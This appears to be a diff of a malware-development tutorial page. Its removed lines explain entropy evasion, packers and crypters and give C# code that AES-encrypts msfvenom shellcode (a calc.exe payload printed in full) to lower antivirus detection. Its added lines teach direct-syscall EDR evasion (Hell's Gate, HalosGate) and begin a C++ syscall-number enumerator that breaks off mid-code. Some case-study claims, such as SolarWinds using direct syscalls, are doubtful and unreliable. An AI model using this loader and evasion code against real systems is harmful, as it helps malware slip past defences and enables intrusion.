-            <p class="text-indigo-400 font-bold">4.0 – 6.0</p>
-            <div class="h-2 mt-4 bg-gray-600 rounded-full overflow-hidden">
-              <div class="h-full bg-indigo-400" style="width:60%"></div>
             </div>
-            <p class="mt-3 text-sm text-gray-300">Highly repetitive ASCII</p>
-          </div>
-          <div class="relative bg-gray-700 bg-opacity-50 p-6 rounded-2xl shadow-lg overflow-hidden transform hover:scale-105 transition-transform duration-300">
-            <div class="absolute -top-6 -right-6 w-32 h-32 bg-purple-500 opacity-20 blur-2xl animation-delay-500"></div>
-            <h3 class="text-lg font-semibold text-white mb-2">Native Executables: /bin/bash, kernel32.dll</h3>
-            <p class="text-purple-400 font-bold">6.0 – 7.0</p>
-            <div class="h-2 mt-4 bg-gray-600 rounded-full overflow-hidden">
-              <div class="h-full bg-purple-400" style="width:70%"></div>
+            <div class="group bg-gray-900 hover:bg-purple-800 transition p-6 rounded-2xl shadow-xl">
+            <div class="flex items-center mb-4">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-purple-400 group-hover:text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M11 12h6m2 0a2 2 0 11-4 0 2 2 0 014 0zm-8 0a2 2 0 11-4 0 2 2 0 014 0zm2 0v3m0-6V5m0 0H5m10 0h4" />
+                </svg>
+                <h3 class="ml-3 text-2xl font-semibold">High-Value, High-Risk Targets</h3>
             </div>
-            <p class="mt-3 text-sm text-gray-300">Code mixed with headers</p>
-          </div>
-          <div class="relative bg-gray-700 bg-opacity-50 p-6 rounded-2xl shadow-lg overflow-hidden transform hover:scale-105 transition-transform duration-300">
-            <div class="absolute -top-6 -right-6 w-32 h-32 bg-teal-500 opacity-20 blur-2xl animation-delay-1000"></div>
-            <h3 class="text-lg font-semibold text-white mb-2">Compressed archives (ZIP, RAR)</h3>
-            <p class="text-teal-400 font-bold">7.5 – 7.9</p>
-            <div class="h-2 mt-4 bg-gray-600 rounded-full overflow-hidden">
-              <div class="h-full bg-teal-400" style="width:88%"></div>
-            </div>
-            <p class="mt-3 text-sm text-gray-300">Flattened byte frequencies</p>
-          </div>
-          <div class="relative bg-gray-700 bg-opacity-50 p-6 rounded-2xl shadow-lg overflow-hidden transform hover:scale-105 transition-transform duration-300">
-            <div class="absolute -top-6 -right-6 w-32 h-32 bg-red-500 opacity-20 blur-2xl animation-delay-1500"></div>
-            <h3 class="text-lg font-semibold text-white mb-2">Encrypted/Packed Payloads</h3>
-            <p class="text-red-400 font-bold">7.8 – 8.0</p>
-            <div class="h-2 mt-4 bg-gray-600 rounded-full overflow-hidden">
-              <div class="h-full bg-red-400" style="width:98%"></div>
-            </div>
-            <p class="mt-3 text-sm text-gray-300">Near-uniform</p>
-          </div>
-        </div>
-      </section>
-      <br>
-      <section class="relative rounded-2xl bg-gradient-to-br from-gray-800 to-black p-8 overflow-visible shadow-2xl">
-        <div class="absolute -top-16 -left-16 w-64 h-64 bg-gradient-to-tr from-yellow-500 to-orange-1000 opacity-20 blur-3xl animate-blob"></div>
-        <div class="absolute -bottom-16 -right-16 w-64 h-64 bg-gradient-to-br from-purple-500 to-pink-500 opacity-20 blur-3xl animate-blob animation-delay-2000"></div>
-        <div class="relative z-10 flex flex-col md:flex-row items-start md:items-center md:space-x-6 space-y-4 md:space-y-0">
-          <div class="flex-shrink-0">
-            <svg class="w-12 h-12 text-yellow-400 animate-pulse" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M3 12h18M3 6h18M3 18h18" />
-            </svg>
-          </div>
-          <div class="text-gray-200">
-            <h2 class="text-2xl font-bold text-white">Compression-Then-Encryption</h2>
-            <h3 class="text-lg text-yellow-400 mb-2">Beating the Entropy Sensor</h3>
-            <p class="leading-relaxed">
-                Static engines often flag any section with near-perfect entropy (~7.9 bits/byte). LockBit sidesteps this by LZ-compressing each victim file before running 
-                AES-CTR. Compressed data skews entropy downward just enough to dodge the simplest “high entropy” heuristic while still unpacking correctly after decryption.
+            <p class="text-gray-300 leading-relaxed">
+                Certain syscall families like process creation, memory manipulation, module loading are disproportionately used in exploits and code-injection attacks. AV/EDR tools 
+                prioritize these “high-risk” indices in the Service Dispatch Table to optimize performance while minimizing blind spots.
             </p>
-          </div>
-        </div>
-      </section>
-      <br>
-      <div class="relative space-y-6">
-        <h2 class="text-3xl font-bold text-white">Loader Taxonomy: <span class="text-blue-400">Packers vs. Crypters vs. Protectors</span></h2>
-        <p class="text-gray-300 leading-relaxed">Malware authors leverage specialized builders to wrap payloads in layers of compression, encryption, and anti-analysis:</p>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-          <div class="relative bg-gray-800 bg-opacity-50 p-6 rounded-2xl shadow-lg transform hover:scale-105 transition duration-300">
-            <div class="absolute -top-4 -right-4 w-16 h-16 bg-indigo-500 opacity-20 blur-2xl"></div>
-            <h3 class="text-xl font-semibold text-indigo-300 mb-3">&#9881; Packer</h3>
-            <p class="text-gray-200 mb-2"><strong>What It Does:</strong> Compresses (optionally encrypts) a payload and self-extracts at runtime.</p>
-            <p class="text-gray-400 mb-1"><strong>Examples:</strong> UPX, MPRESS, PECompact</p>
-            <p class="text-gray-400"><strong>Artifacts:</strong> Inflated entry‐point stub; decompression loops in disassembly.</p>
-          </div>
-          <div class="relative bg-gray-800 bg-opacity-50 p-6 rounded-2xl shadow-lg transform hover:scale-105 transition duration-300">
-            <div class="absolute -top-4 -right-4 w-16 h-16 bg-blue-500 opacity-20 blur-2xl animation-delay-500"></div>
-            <h3 class="text-xl font-semibold text-blue-300 mb-3">&#128274; Crypter</h3>
-            <p class="text-gray-200 mb-2"><strong>What It Does:</strong> Encrypts with a user-supplied key and adds a runtime decryptor stub.</p>
-            <p class="text-gray-400 mb-1"><strong>Examples:</strong> ScrubCrypt, CryptOne</p>
-            <p class="text-gray-400"><strong>Artifacts:</strong> Encrypted <code class="bg-gray-800 text-green-300 rounded px-1">.data</code> section; minimal strings; single AES/RC4 stub.</p>
-          </div>
-          <div class="relative bg-gray-800 bg-opacity-50 p-6 rounded-2xl shadow-lg transform hover:scale-105 transition duration-300">
-            <div class="absolute -top-4 -right-4 w-16 h-16 bg-green-500 opacity-20 blur-2xl animation-delay-1000"></div>
-            <h3 class="text-xl font-semibold text-green-300 mb-3">&#128737; Protector</h3>
-            <p class="text-gray-200 mb-2"><strong>What It Does:</strong> Wraps a crypter with VM obfuscation, anti-debug, and integrity checks.</p>
-            <p class="text-gray-400 mb-1"><strong>Examples:</strong> Themida, VMProtect</p>
-            <p class="text-gray-400"><strong>Artifacts:</strong> Custom VM bytecode; mangled import tables; heavy anti-analysis tricks.</p>
-          </div>
-        </div>
-        <section class="relative rounded-2xl bg-gray-900 p-10 overflow-visible shadow-2xl mb-8">
-          <div class="absolute inset-0 bg-gradient-to-br from-gray-800 to-gray-900 opacity-50 rounded-2xl"></div>
-          <div class="relative z-10">
-            <h2 class="text-3xl font-bold text-center text-white">Project Overview:<br>
-              <span class="text-indigo-400">Encryption, Decryption &amp; Execution</span>
-            </h2>
-            <div class="relative pl-12">
-              <div class="absolute top-0 left-5 h-full border-l-2 border-indigo-400"></div>
-              <ul class="space-y-5">
-                <li class="relative">
-                  <div class="absolute -left-7 top-0 w-6 h-6 bg-indigo-400 rounded-full flex items-center sm:text-justify text-gray-900 font-bold">1</div>
-                  <h3 class="text-xl font-semibold text-white">Decrypt the payload</h3>
-                  <p class="text-gray-300 leading-relaxed">
-                    <code class="bg-gray-800 text-green-300 rounded px-1">SmokeScreen()</code> derives a 256-bit key &amp; IV via PBKDF2, then AES-CBC-decrypts <code class="bg-gray-800 text-green-300 rounded px-1">Enc</code> to raw shellcode.
-                  </p>
-                </li>
-                <li class="relative">
-                  <div class="absolute -left-7 top-0 w-6 h-6 bg-indigo-400 rounded-full flex items-center sm:text-justify text-gray-900 font-bold">2</div>
-                  <h3 class="text-xl font-semibold text-white">Allocate memory</h3>
-                  <p class="text-gray-300 leading-relaxed">
-                    <code class="bg-gray-800 text-green-300 rounded px-1">VirtualAlloc(..., MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</code> returns <code class="bg-gray-800 text-green-300 rounded px-1">barrel</code>, marked RWX.
-                  </p>
-                </li>
-                <li class="relative">
-                  <div class="absolute -left-7 top-0 w-6 h-6 bg-indigo-400 rounded-full flex items-center sm:text-justify text-gray-900 font-bold">3</div>
-                  <h3 class="text-xl font-semibold text-white">Inject shellcode</h3>
-                  <p class="text-gray-300 leading-relaxed">
-                    <code class="bg-gray-800 text-green-300 rounded px-1">Marshal.Copy()</code> moves the decrypted bytes into <code class="bg-gray-800 text-green-300 rounded px-1">barrel</code>.
-                  </p>
-                </li>
-                <li class="relative">
-                  <div class="absolute -left-7 top-0 w-6 h-6 bg-indigo-400 rounded-full flex items-center sm:text-justify text-gray-900 font-bold">4</div>
-                  <h3 class="text-xl font-semibold text-white">Launch thread</h3>
-                  <p class="text-gray-300 leading-relaxed">
-                    <code class="bg-gray-800 text-green-300 rounded px-1">CreateThread()</code> starts at <code class="bg-gray-800 text-green-300 rounded px-1">barrel</code>, and <code class="bg-gray-800 text-green-300 rounded px-1">WaitForSingleObject()</code> waits for completion.
-                  </p>
-                </li>
-                <li class="relative">
-                  <div class="absolute -left-7 top-0 w-6 h-6 bg-indigo-400 rounded-full flex items-center sm:text-justify text-gray-900 font-bold">5</div>
-                  <h3 class="text-xl font-semibold text-white">Stealth mode</h3>
-                  <p class="text-gray-300 leading-relaxed">
-                    <code class="bg-gray-800 text-green-300 rounded px-1">GetConsoleWindow() + ShowWindow()</code> hides the console before decryption.
-                  </p>
-                </li>
-              </ul>
             </div>
-          </div>
-        </section>
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-          <h2 class="text-3xl font-bold text-white">Detection: <span class="text-blue-400">Before vs. After Encryption</span></h2>
-          <div class="grid grid-cols-1 md:grid-cols-2 gap-6"></div>
-          <div class="relative group overflow-hidden rounded-2xl shadow-lg">
-            <code class="bg-gray-800 text-green-300 rounded px-1">Before</code> 
-            <img src="../MalDev/images/b4enc.png" alt="Before" class="w-full h-auto transition-transform ">
-              <div class="absolute inset-0 bg-black bg-opacity-40 flex items-center sm:text-justify opacity-0 ">
-              </div>
-            </div>
-            <div class="relative group overflow-hidden rounded-2xl shadow-lg">
-              <code class="bg-gray-800 text-green-300 rounded px-1">After</code> 
-              <img src="../MalDev/images/afenc.png" alt="After" class="w-full h-auto transition-transform ">
-              <div class="absolute inset-0 bg-black bg-opacity-40 flex items-center sm:text-justify opacity-0 ">
-              </div>
-            </div>
-          </div>
-          <p class="leading-relaxed text-gray-300 "> ⚠️ The detection rate fell from 57 down to 19, likely because of un-obfuscated strings (we’ll cover string obfuscation techniques later).
         </div>
-    </section>
-    <section class="relative rounded-2xl bg-gray-900 p-8 overflow-visible shadow-2xl ">
-      <div class="absolute -bottom-16 -right-16 w-72 h-72 bg-gradient-to-br from-green-400 to-blue-600 opacity-30 blur-3xl animate-blob animation-delay-2000"></div>
-      <div class="relative space-y-6">
-        <h2 class="text-3xl font-bold text-white">C# project: <span class="text-blue-400">Encryption &amp; Decryption</span></h2>
+        </div>
+        <br>
+        <blockquote class="border-l-4 border-blue-400 pl-4 italic">
+        In short:
+        <br>
+        In short, syscalls are watched most because they're a concentrated point of risk, defenders get maximum insight with minimal false positives, while attackers see them as a 
+        key to success. This makes understanding syscall monitoring essential for both red-team evasion and blue-team hardening.
+        </blockquote>
+        </div>
+        <br>
+        <div class="bg-gray-800 bg-opacity-60 p-8 rounded-3xl shadow-2xl backdrop-blur-md">
+        <h2 class="text-4xl font-bold text-indigo-300 mb-4">Cybersecurity Takeaways</h2>
+        <p class="text-gray-200">
+        <strong>Offensive Angle:</strong> If you're testing defenses, leveraging direct calls can help evade initial detection since they're less commonly monitored. For example, in a red-team 
+        exercise, using direct syscalls might bypass API-based hooks, giving you an edge in stealthy persistence. However, if EDR is tuned for kernel-level monitoring, it could 
+        backfire and alert defenders faster.
+        </p>
+        <p class="text-gray-200">
+        <strong>Defensive Angle:</strong> As a blue-teamer, focusing your monitoring on indirect calls provides the best bang for your buck, covering 80-90% of potential threats 
+        with less overhead. But always layer in direct call detection for high-confidence alerts.
+        </p>
+        </div>
+        <br>
+        <div class="bg-gray-800 bg-opacity-60 p-8 rounded-3xl shadow-2xl backdrop-blur-md">
+        <h2 class="text-center mb-12 text-5xl font-extrabold text-gradient-to-r from-red-500 to-pink-500">Evasion Techniques</h2>
+        <div class="max-w-4xl mx-auto space-y-15">
+        <div class="relative before:absolute before:top-0 before:left-1/2 before:-ml-px before:h-full before:w-1 before:bg-gray-700">
+            <div class="flex items-center justify-between w-full">
+            <div class="w-1/2 pr-8 text-right py-10">
+                <h4 class="text-2xl font-semibold text-yellow-400 mb-3">Using Direct Syscall</h4>
+                <p class="mt-4 text-gray-300 text-left sm:text-justify">
+                    Bypasses user-mode hooks by issuing the <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">syscall/sysenter</code> instruction directly or calling the <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">Nt* stub</code> in <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">ntdll.dll</code> by index. 
+                    No Win32/API wrapper, no IAT entry, AV/EDR misses most of these calls.
+                </p>
+            </div>
+            <div class="flex-shrink-0">
+                <div class="w-8 h-8  rounded-full flex items-center justify-center text-white font-bold"></div>
+            </div>
+            </div>
+            <div class="flex items-center justify-between w-full">
+            <div class="flex-shrink-0">
+                <div class="w-8 h-8 rounded-full flex items-center justify-left text-white font-bold"></div>
+            </div>
+            <div class="w-1/2 pl-8 ">
+                <h4 class="text-2xl font-semibold text-green-400 mb-3">Hell’s Gate & SysWhispers</h4>
+                <p class="mt-4 text-gray-300 text-left sm:text-justify">
+                    Dynamically resolve and invoke syscalls by patching in-memory stubs that map to kernel service numbers, avoiding static import of <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">ntdll.dll</code> functions. 
+                    This thwarts signature-based detection of known syscall trampolines.
+                </p>
+            </div>
+            </div>
+            <div class="flex items-center justify-between w-full">
+            <div class="w-1/2 pr-8 text-right">
+                <h4 class="text-2xl font-semibold text-blue-400 mb-3">Syscall Proxying and Obfuscation</h4>
+                <p class="mt-4 text-gray-300 text-left sm:text-justify">
+                    Redirect syscall calls through custom proxies or wrappers to mask their origin. On Linux, you might hook into the syscall table with a user-defined function that 
+                    randomizes parameters or adds noise, confusing behavioral analyzers. In Windows, techniques like syscall proxying can involve injecting code that mimics legitimate 
+                    processes, making it tougher for ETW logging to pin down malicious activity.
+                </p>
+            </div>
+            <div class="flex-shrink-0">
+                <div class="w-8 h-8 rounded-full flex items-center justify-center text-white font-bold"></div>
+            </div>
+            </div>
+            <div class="flex items-center justify-between w-full">
+                <div class="flex-shrink-0">
+                    <div class="w-8 h-8 rounded-full flex items-center justify-left text-white font-bold"></div>
+                </div>
+                <div class="w-1/2 pl-8 ">
+                    <h4 class="text-2xl font-semibold text-orange-400 mb-3">Syscall Randomization and Dynamic Loading</h4>
+                    <p class="mt-4 text-gray-300 text-left sm:text-justify">
+                        Instead of sticking to static syscall numbers, randomize or load them at runtime to avoid predictable patterns that EDR tools might flag. 
+                        For example, in Windows, you could write code that scans the PEB (Process Environment Block) or uses libraries like HalosGate to dynamically fetch and 
+                        invoke syscall indices. On Linux, leverage tools or custom scripts to alter syscall arguments or use seccomp filters to mask calls, making it harder for 
+                        behavioral analyzers to build a profile of your activity. This technique helps evade machine learning-based detection by introducing variability, perfect 
+                        for red-team exercises where you want to simulate adaptive threats.
+                    </p>
+                </div>
+            </div>
+        </div>
+        </div>
+        </div>
+        <br>
+        <div class="bg-gray-800 bg-opacity-60 p-8 rounded-3xl shadow-2xl backdrop-blur-md">
+        <h2 class="text-center mb-12 text-5xl font-extrabold text-gradient-to-r from-red-500 to-pink-500">Real-World Case Studies</h2>
+        <div class="space-y-8">
+        <!-- Turla -->
+        <div class="flex items-start space-x-6">
+        <div class="mt-1">
+            <span class="inline-block w-4 h-4 bg-yellow-400 rounded-full"></span>
+        </div>
+        <div>
+            <h4 class="text-2xl font-semibold text-yellow-400">SolarWinds Supply Chain Attack (2020):</h4>
+            <p class="text-gray-300 mt-1">
+                In this high-profile incident, attackers manipulated syscalls to maintain persistence and evade detection.
+                They used direct syscall invocations to interact with kernel objects without triggering user-mode hooks, allowing them to move laterally and steal data for months. 
+                Takeaway for pen testers, this shows how dynamic syscall handling can bypass even mature EDR systems, try replicating this in your tests to expose similar weaknesses.
+            </p>
+        </div>
+        </div>
+        <!-- Cobalt Strike -->
+        <div class="flex items-start space-x-6">
+        <div class="mt-1">
+            <span class="inline-block w-4 h-4 bg-green-400 rounded-full"></span>
+        </div>
+        <div>
+            <h4 class="text-2xl font-semibold text-green-400">Cobalt Strike HalosGate & HellsGate syscaller:</h4>
+            <p class="text-gray-300 mt-1">
+                Cobalt Strike’s HalosGate & HellsGate syscaller technique dynamically builds syscall stubs at runtime, pulling the SSDT index from <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">KiServiceTable</code>. 
+                This allowed red-team operators to call syscalls by number without ever importing native API functions, evading both user-mode and basic kernel-mode hooks.
+            </p>
+        </div>
+        </div>
+        <!-- Ryuk -->
+        <div class="flex items-start space-x-6">
+        <div class="mt-1">
+            <span class="inline-block w-4 h-4 bg-blue-400 rounded-full"></span>
+        </div>
+        <div>
+            <h4 class="text-2xl font-semibold text-blue-400">WannaCry Ransomware (2017):</h4>
+            <p class="text-gray-300 mt-1">
+                While not syscall-specific, WannaCry leveraged indirect syscalls for file encryption, but advanced variants learned from it. 
+                Modern ransomware now often mixes direct and indirect calls to confuse monitors. For example, using <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">NtCreateFile</code> directly for speed while avoiding API logs. 
+                Lesson: Evasion isn't just about speed; it's about adaptability, test how your syscall-based tools hold up against behavioral analytics in a lab.
+            </p>
+        </div>
+        </div>
+        <!-- Discord Loader -->
+        <div class="flex items-start space-x-6">
+        <div class="mt-1">
+            <span class="inline-block w-4 h-4 bg-purple-400 rounded-full"></span>
+        </div>
+        <div>
+            <h4 class="text-2xl font-semibold text-purple-400">Discord Loader (2021)</h4>
+            <p class="text-gray-300 mt-1">
+                A loader distributed via Discord abused Linux’s <code class="bg-[#334155] text-blue-300 rounded px-1 break-words whitespace-normal">io_uring</code> interface to download and write payloads in a single batched syscall submission. 
+                Defenders monitoring only individual read/write syscalls missed the combined operation, delaying detection.
+            </p>
+        </div>
+        </div>
+        </div>
+        </div>
+        <br>
+        <div class="bg-gray-800 bg-opacity-60 p-8 rounded-3xl shadow-2xl backdrop-blur-md">
+        <h2 class="text-4xl font-bold text-green-300 text-center">Project</h2><br>
         <details class="bg-gray-800 bg-opacity-50 p-4 rounded-lg group">
-          <summary class="flex items-center justify-between text-xl font-semibold text-pink-400 cursor-pointer ">
-            <span>Encryption Project</span>
-            <svg class="w-6 h-6 transform transition-transform duration-200 group-open:rotate-180 text-pink-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+        <summary class="flex items-center justify-between text-xl font-semibold text-cyan-500 cursor-pointer ">
+            <div class="max-w-full overflow-x-auto">
+            <span class="inline-block whitespace-nowrap font-semibold text-cyan-500">
+                SSN Enumeration
+            </span>
+            </div>
+            <svg class="w-6 h-6 transform transition-transform duration-200 group-open:rotate-180 text-cyan-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
             </svg>
-          </summary>
-          <div class="mt-4 relative ">
+        </summary>
+        <div class="relative ">
             <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
-            <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
-              <code class="language-csharp text-green-300  ">
-                using System.Security.Cryptography;
-                using System.IO;
-                using System.Text;
-                using System;
-
-                public class ENC
-                {
-                    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
-                    {
-                        byte[] encryptedBytes = null;
-                        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
-                        using (MemoryStream ms = new MemoryStream())
-                        {
-                            using (RijndaelManaged AES = new RijndaelManaged())
-                            {
-                                AES.KeySize = 256;
-                                AES.BlockSize = 128;
-                                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
-                                AES.Key = key.GetBytes(AES.KeySize / 8);
-                                AES.IV = key.GetBytes(AES.BlockSize / 8);
-                                AES.Mode = CipherMode.CBC;
-                                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
-                                {
-                                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
-                                    cs.Close();
-                                }
-                                encryptedBytes = ms.ToArray();
-                            }
+            <pre class=" overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
+            <pre><code class="language-cpp text-green-300">
+                // Project Name: Syscall-SSN Enumerator
+                // By: Iron Hulk
+                
+                #include &lt;windows.h&gt;
+                #include &lt;iostream&gt;
+                #include &lt;vector&gt;
+                #include &lt;string&gt;
+                #include &lt;sstream&gt;
+                #include &lt;iomanip&gt;
+                
+                typedef LONG (NTAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);
+                
+                struct ExportInfo {
+                    std::string name;
+                    DWORD       ssn;
+                };
+                
+                std::vector&lt;ExportInfo&gt; GetNtExportsSSN() {
+                    HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
+                    if (!hNtdll) throw std::runtime_error("LoadLibrary failed");
+                
+                    auto dos     = reinterpret_cast&lt;PIMAGE_DOS_HEADER&gt;(hNtdll);
+                    auto nt      = reinterpret_cast&lt;PIMAGE_NT_HEADERS&gt;(
+                                        reinterpret_cast&lt;BYTE*&gt;(hNtdll) + dos-&gt;e_lfanew);
+                    auto exports = reinterpret_cast&lt;PIMAGE_EXPORT_DIRECTORY&gt;(
+                                        reinterpret_cast&lt;BYTE*&gt;(hNtdll) +
+                                        nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+                
+                    auto names = reinterpret_cast&lt;DWORD*&gt;(
+                                    reinterpret_cast&lt;BYTE*&gt;(hNtdll) + exports-&gt;AddressOfNames);
+                    auto funcs = reinterpret_cast&lt;DWORD*&gt;(
+                                    reinterpret_cast&lt;BYTE*&gt;(hNtdll) + exports-&gt;AddressOfFunctions);
+                    auto ords  = reinterpret_cast&lt;WORD*&gt;(
+                                    reinterpret_cast&lt;BYTE*&gt;(hNtdll) + exports-&gt;AddressOfNameOrdinals);
+                
+                    std::vector&lt;ExportInfo&gt; list;
+                    for (DWORD i = 0; i &lt; exports-&gt;NumberOfNames; ++i) {
+                        const char* fnName = reinterpret_cast&lt;const char*&gt;(hNtdll) + names[i];
+                        DWORD       rva    = funcs[ords[i]];
+                        BYTE*       stub   = reinterpret_cast&lt;BYTE*&gt;(hNtdll) + rva;
+                
+                        /* mov r10, rcx ; mov eax, imm32 ; syscall */
+                        if (stub[0] == 0x4C &amp;&amp; stub[1] == 0x8B &amp;&amp; stub[2] == 0xD1 &amp;&amp; stub[3] == 0xB8) {
+                            DWORD ssn = *reinterpret_cast&lt;DWORD*&gt;(stub + 4);
+                            list.push_back({ fnName, ssn });
                         }
-                        return encryptedBytes;
                     }
-                    public static void PrintShellcode(byte[] shellcodeBytes)
-                    {
-                        StringBuilder shellcode = new StringBuilder();
-                        shellcode.Append("byte[] Enc = new byte[");
-                        shellcode.Append(shellcodeBytes.Length);
-                        shellcode.Append("] { ");
-                        for (int i = 0; i < shellcodeBytes.Length; i++)
-                        {
-                            shellcode.Append("0x");
-                            shellcode.AppendFormat("{0:x2}", shellcodeBytes[i]);
-                            if (i < shellcodeBytes.Length - 1)
-                            {
-                                shellcode.Append(",");
-                            }
-                        }
-                        shellcode.Append(" };");
-                        Console.WriteLine(shellcode.ToString());
-                    }
-                    public static void Main(string[] args)
-                    {
-                        //msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
-                        byte[] buf = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
-                        0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
-                        0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
-                        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
-                        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
-                        0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
-                        0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
-                        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
-                        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
-                        0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
-                        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
-                        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
-                        0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
-                        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
-                        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
-                        0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
-                        0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
-                        0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
-                        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
-                        0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
-                        0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
-                        0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
-                        0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
-                        0x63,0x2e,0x65,0x78,0x65,0x00};
-
-                        byte[] key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("MyK3yG0o0zH3r3")); // Change Password if needed
-                        byte[] shellcodeEncrypted = AES_Encrypt(buf, key);
-                        PrintShellcode(shellcodeEncrypted);
-                    }
+                    return list;
                 }
-              </code>
+                
+                int main() {
+                    OSVERSIONINFOEXW osvi = {};
+                    osvi.dwOSVersionInfoSize = sizeof(osvi);
+                
+                    if (auto hNtDll = GetModuleHandleW(L"ntdll.dll")) {
+                        auto rtlGetVersion = reinterpret_cast&lt;RtlGetVersionPtr&gt;(
+                                                GetProcAddress(hNtDll, "RtlGetVersion"));
+                        if (rtlGetVersion)
+                            rtlGetVersion(&amp;osvi);
+                        else
+                            GetVersionExW(reinterpret_cast&lt;OSVERSIONINFOW*&gt;(&amp;osvi)); // legacy
+                    }
+                
+                    std::wstring osName;
+                    if (osvi.dwMajorVersion == 10)
+                        osName = (osvi.dwBuildNumber &gt;= 22000) ? L"Windows 11" : L"Windows 10";
+                    else if (osvi.dwMajorVersion == 6 &amp;&amp; osvi.dwMinorVersion == 3) osName = L"Windows 8.1";
+                    else if (osvi.dwMajorVersion == 6 &amp;&amp; osvi.dwMinorVersion == 2) osName = L"Windows 8";
+                    else if (osvi.dwMajorVersion == 6 &amp;&amp; osvi.dwMinorVersion == 1) osName = L"Windows 7";
+                    else                                                         osName = L"Windows (unknown)";
+                
+                    std::wcout &lt;&lt; L"OS Name:    " &lt;&lt; osName &lt;&lt; L"\n"
+                                &lt;&lt; L"OS Version: "
+                                &lt;&lt; osvi.dwMajorVersion &lt;&lt; L'.'
+                                &lt;&lt; osvi.dwMinorVersion &lt;&lt; L" (Build "
+                                &lt;&lt; osvi.dwBuildNumber  &lt;&lt; L")\n";
+                
+                    BOOL isWow64 = FALSE;
+                    auto fnIsWow64 = reinterpret_cast&lt;BOOL (WINAPI*)(HANDLE,PBOOL)&gt;(
+                                        GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process"));
+                
+                #ifdef _WIN64
+                    std::cout &lt;&lt; "Process architecture: x64\nOS architecture:      x64\n";
+                #else
+                    std::cout &lt;&lt; "Process architecture: x86\n";
+                    if (fnIsWow64 &amp;&amp; fnIsWow64(GetCurrentProcess(), &amp;isWow64) &amp;&amp; isWow64)
+                        std::cout &lt;&lt; "OS architecture:      x64 (WOW64)\n";
+                    else
+                        std::cout &lt;&lt; "OS architecture:      x86\n";
+                #endif
+                
+                    std::cout &lt;&lt; "\nSyscall SSNs:\n\n";
+                
+                    try {
+                        auto exports = GetNtExportsSSN();
+                
